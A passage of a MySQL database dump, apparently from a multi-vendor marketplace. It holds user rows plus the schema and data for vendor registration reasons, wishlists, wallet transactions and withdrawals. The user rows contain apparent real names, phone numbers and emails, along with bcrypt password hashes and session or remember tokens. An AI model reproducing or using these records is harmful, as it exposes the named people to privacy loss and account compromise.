(0,'walking customer','walking','customer','000000000000','def.png','walking@customer.com',NULL,'',NULL,NULL,'2022-02-03 03:46:01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,NULL,NULL,NULL,NULL,NULL,0,NULL,0,NULL,NULL,0,0,NULL,NULL,NULL,'en'),
(2,'Muhiddin Kabraliev','Muhiddin','Kabraliev','+998905650213','def.png','kabraliev2005@gmail.com',NULL,'$2y$10$CLZ4STid3y7XGL7FkuKxS./fK/3GNO/UgiXoNdNHLlGH1d2t2uKRG','5U7n7vCmgPA4rtvthJ9TLuYTBq7qlpOMg9xV9sjkuQ0fc9p0k1EInKrWvZOg','2025-06-30 12:42:04','2025-06-30 12:42:41',NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,NULL,NULL,NULL,NULL,NULL,0,NULL,0,NULL,0.0000,0,0,NULL,'9GRLNDI8VNESNDRRGE6P',NULL,'en'),
(3,'Samandar Azamov','Samandar','Azamov','+998888112309','def.png','admin@jscorp.uz',NULL,'$2y$10$wnAEi5FwfikONKpK659lZODzZI7hn8lMBesGsJUYJXKy6CwFkkmne','0HIjEUFwzUewYScabHu5IKH1vesyijAL2DNtvSUXSX7YIQeiM8vgQKEAynaM','2025-07-11 22:44:10','2025-07-11 22:44:26',NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,NULL,NULL,NULL,NULL,NULL,0,NULL,0,NULL,0.0000,0,0,NULL,'ZZYUZHTSWTB55PU6XWXD',NULL,'en');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `vendor_registration_reasons`
--

DROP TABLE IF EXISTS `vendor_registration_reasons`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `vendor_registration_reasons` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(191) NOT NULL,
  `description` text DEFAULT NULL,
  `priority` tinyint(4) NOT NULL DEFAULT 1,
  `status` tinyint(4) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `vendor_registration_reasons`
--

LOCK TABLES `vendor_registration_reasons` WRITE;
/*!40000 ALTER TABLE `vendor_registration_reasons` DISABLE KEYS */;
INSERT INTO `vendor_registration_reasons` VALUES
(1,'Millions of Users','Access a vast audience with millions of active users ready to buy your products.',1,1,NULL,NULL),
(2,'Free Marketing','Benefit from our extensive, no-cost marketing efforts to boost your visibility and sales.',2,1,NULL,NULL),
(3,'SEO Friendly','Enjoy enhanced search visibility with our SEO-friendly platform, driving more traffic to your listings.',3,1,NULL,NULL),
(4,'24/7 Support','Get round-the-clock support from our dedicated team to resolve any issues and assist you anytime.',4,1,NULL,NULL),
(5,'Easy Onboarding','Start selling quickly with our user-friendly onboarding process designed to get you up and running fast.',5,1,NULL,NULL);
/*!40000 ALTER TABLE `vendor_registration_reasons` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wallet_transactions`
--

DROP TABLE IF EXISTS `wallet_transactions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `wallet_transactions` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) unsigned DEFAULT NULL,
  `transaction_id` char(36) NOT NULL,
  `credit` decimal(24,3) NOT NULL DEFAULT 0.000,
  `debit` decimal(24,3) NOT NULL DEFAULT 0.000,
  `admin_bonus` decimal(24,3) NOT NULL DEFAULT 0.000,
  `balance` decimal(24,3) NOT NULL DEFAULT 0.000,
  `transaction_type` varchar(191) DEFAULT NULL,
  `payment_method` varchar(255) DEFAULT NULL,
  `reference` varchar(191) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wallet_transactions`
--

LOCK TABLES `wallet_transactions` WRITE;
/*!40000 ALTER TABLE `wallet_transactions` DISABLE KEYS */;
/*!40000 ALTER TABLE `wallet_transactions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wishlists`
--

DROP TABLE IF EXISTS `wishlists`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `wishlists` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `customer_id` bigint(20) NOT NULL,
  `product_id` bigint(20) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wishlists`
--

LOCK TABLES `wishlists` WRITE;
/*!40000 ALTER TABLE `wishlists` DISABLE KEYS */;
INSERT INTO `wishlists` VALUES
(1,3,2,'2025-07-11 22:44:45','2025-07-11 22:44:45');
/*!40000 ALTER TABLE `wishlists` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `withdraw_requests`
--

DROP TABLE IF EXISTS `withdraw_requests`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `withdraw_requests` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `seller_id` bigint(20) DEFAULT NULL,
  `delivery_man_id` bigint(20) DEFAULT NULL,
  `admin_id` bigint(20) DEFAULT NULL,
  `amount` varchar(191) NOT NULL DEFAULT '0.00',
  `withdrawal_method_id` bigint(20) unsigned DEFAULT NULL,
  `withdrawal_method_fields` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL,
  `transaction_note` text DEFAULT NULL,
  `approved` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `withdraw_requests`
--

LOCK TABLES `withdraw_requests` WRITE;
/*!40000 ALTER TABLE `withdraw_requests` DISABLE KEYS */;
/*!40000 ALTER TABLE `withdraw_requests` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `withdrawal_methods`
--

DROP TABLE IF EXISTS `withdrawal_methods`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `withdrawal_methods` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `method_name` varchar(191) NOT NULL,
  `method_fields` text NOT NULL,
  `is_default` tinyint(4) NOT NULL DEFAULT 0,
  `is_active` tinyint(4) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `withdrawal_methods`
--

LOCK TABLES `withdrawal_methods` WRITE;
/*!40000 ALTER TABLE `withdrawal_methods` DISABLE KEYS */;
/*!40000 ALTER TABLE `withdrawal_methods` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-07-13  7:36:44
